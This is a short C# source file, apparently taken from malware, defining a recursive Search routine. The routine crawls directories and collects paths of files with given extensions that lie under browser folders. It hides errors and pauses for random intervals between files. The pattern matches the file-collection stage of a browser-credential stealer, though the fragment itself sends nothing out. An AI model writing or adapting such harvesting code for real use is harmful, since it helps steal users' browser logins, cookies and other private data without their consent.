using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

internal class Recursive
{
	public static void Search(string path, ref List<string> _out, string[] browsers, string[] search_files, int recursive_max = -1, int i = 0, bool search = false)
	{
		if (!search && recursive_max > 0)
		{
			if (i < recursive_max)
			{
				i++;
			}
			else
			{
				for (int j = 0; j < browsers.Length; j++)
				{
					if (search)
					{
						break;
					}
					if (path.ToLower().Contains(browsers[j].ToLower()))
					{
						search = true;
					}
				}
				if (!search)
				{
					return;
				}
			}
		}
		DirectoryInfo Info = new DirectoryInfo(path);
		DirectoryInfo[] array = null;
		IEnumerable<FileInfo> enumerable = null;
		try
		{
			array = Info.GetDirectories();
			enumerable = search_files.SelectMany((string ext) => Info.GetFiles(ext));
		}
		catch
		{
		}
		if (enumerable != null && enumerable.Count() > 0)
		{
			foreach (FileInfo item in enumerable)
			{
				for (int k = 0; k < browsers.Length; k++)
				{
					if (item.FullName.ToLower().Contains(browsers[k]))
					{
						_out.Add(item.FullName);
						break;
					}
				}
				Thread.Sleep(new Random().Next(35, 60));
			}
		}
		if (array != null && array.Count() > 0)
		{
			DirectoryInfo[] array2 = array;
			for (int l = 0; l < array2.Length; l++)
			{
				Search(array2[l].FullName, ref _out, browsers, search_files, recursive_max, i, search);
			}
		}
	}
}
